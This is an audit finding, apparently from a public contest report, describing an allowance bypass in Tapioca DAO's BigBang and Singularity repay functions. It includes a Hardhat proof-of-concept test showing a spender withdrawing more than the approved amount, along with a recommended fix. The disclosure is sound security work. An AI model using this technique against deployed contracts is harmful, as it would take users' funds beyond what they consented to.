[H-44]BigBang::repayandSingularity::repayspend more than allowed amount
Submitted byzzzitron
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L52
When an user allows certain amount to a spender, the spender can spend more than the allowance.
Note that this is a different issue from the misuse ofallowedBorrowfor the share amount
(i.e. issue ”BigBang::repayusesallowedBorrowwith the asset amount, whereas other functions use it with share of collateral”), as the fix in the other issue will not mitigate this issue.
This issue is the misuse ofpartandelastic, whereas the other issue is the misuse of theshareandasset.
Proof of Concept
The spec in theMarketERC20::approvefunction specifies that the approved amount is the maximum amount that the spender can draw.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/364dead3a42b06a34c802eee951cea1a654d438e/contracts/markets/MarketERC20.sol#L189-L200
/// @notice Approves `amount` from sender to be spend by `spender`./// @param spender Address of the party that can draw from msg.sender's account./// @param amount The maximum collective amount that `spender` can draw./// @return (bool) Returns True if approved.function approve(address spender,uint256 amount) public override returns (bool) {
However, the spender can draw more than the allowance if thetotalBorrow.baseis more thanttotalBorrow.elastic, which is likely condition.
The proof of concept below demonstrates that more asset was pulled than allowed.
It is only a part of proof of concept; to see the full proof of concept seehttps://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9To use it, put it in thetest/bigBang.test.tsin the tapiocabar-audit repo
The eoa1 allows deployer 1e18. After thetimeTravel, the elastic oftotalBorrowis more than thebase. Under the condition, the deployer uses the allowance with theBigBang::repayfunction. As the result, more asset than allowance was pulled from eoa1.
it('should not allow repay more PoCRepayMoreThanAllowed',async()=>{////////// setup steps are omitted// the full proof of concept is// https://gist.github.com/zzzitron/8dd809c0ea39dc0ea727534c3ba804f9////////// eoa1 allows deployer (it should be `approve`, if the modifier in the repay is `allowedLend`)constallowedPart=ethers.BigNumber.from((1e18).toString());awaitwethBigBangMarket.connect(eoa1).approveBorrow(deployer.address,allowedPart);//repay from eoa1// check more than the allowed amount is pulled from yieldBoxtimeTravel(10*86400);// repay from eoa1 the allowed amount// balance before repay of eoa in the yieldBox for the assetconstusdoAssetId=awaitwethBigBangMarket.assetId();consteoa1ShareBalanceBefore=awaityieldBox.balanceOf(eoa1.address,usdoAssetId);consteoa1AmountBefore=awaityieldBox.toAmount(usdoAssetId,eoa1ShareBalanceBefore,false);awaitwethBigBangMarket.repay(eoa1.address,deployer.address,false,allowedPart,);consteoa1ShareBalanceAfter=awaityieldBox.balanceOf(eoa1.address,usdoAssetId);consteoa1AmountAfter=awaityieldBox.toAmount(usdoAssetId,eoa1ShareBalanceAfter,false);console.log(eoa1AmountBefore.sub(eoa1AmountAfter).toString());expect(eoa1AmountBefore.sub(eoa1AmountAfter).gt(allowedPart)).to.be.true;});
The result of the poc is below, which shows that1000136987569097987is pulled from the eoa1, which is more than the allowance (i.e. 1e18).
BigBang testpoc1000136987569097987✔ should not allow repay more PoCRepayMoreThanAllowed (11934ms)
The same issue is also in theSingularity. In the same manner shown above, the spender will pull more than allowed when thetotalBorrow.elasticis bigger than thetotalBorrow.base.
Details of the bug
The functionBigBang::repayusespartto check for the allowance.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L263-L268
However, theBigBang::_repaydraws actually the correspondingelasticof thepartfrom thefromaddress.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L721-L732
function_repay(addressfrom,addressto,uint256part)internalreturns(uint256amount) {(totalBorrow,amount) =totalBorrow.sub(part,true);userBorrowPart[to] -=part;uint256toWithdraw= (amount-part);//acrrueduint256toBurn=amount-toWithdraw;yieldBox.withdraw(assetId,from,address(this),amount,0);
The similar lines of code is also in theSingularity. TheSingularity::repaywill delegate call on theSGLBorrow::repay, which has the modifier ofallowedBorrow(from, part):
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLBorrow.sol#L45-L51
// SGLBorrowfunctionrepay(addressfrom,addressto,boolskim,uint256part)publicnotPausedallowedBorrow(from,part)returns(uint256amount) {updateExchangeRate();
Then,amountis calculated from thepart, and theamountis pulled from thefromaddress in the below code snippet.
https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/a4793e75a79060f8332927f97c6451362ae30201/contracts/markets/singularity/SGLLendingCommon.sol#L83-L95
function_repay(addressfrom,addressto,boolskim,uint256part)internalreturns(uint256amount) {(totalBorrow,amount) =totalBorrow.sub(part,true);userBorrowPart[to] -=part;uint256share=yieldBox.toShare(assetId,amount,true);uint128totalShare=totalAsset.elastic;_addTokens(from,to,assetId,share,uint256(totalShare),skim);totalAsset.elastic=totalShare+uint128(share);emitLogRepay(skim?address(yieldBox) :from,to,amount,part);}
Theamountis likely to be bigger than thepart, since the calculation is based on thetotalBorrow’s ratio betweenelasticandbase.
Then theamountis used to withdraw fromfromaddress, meaning that more than the allowance is withdrawn.
The discrepancy between the allowance and actually spendable amount is going to grow in time, as thetotalBorrow’s elastic will outgrow the base in time.
Tools Used
Hardhat
Recommended Mitigation Steps
Instead of using thepartto check the allowance, calculate the actual amount to be pulled and use the amount to check the allowance.
0xRektora (Tapioca) confirmed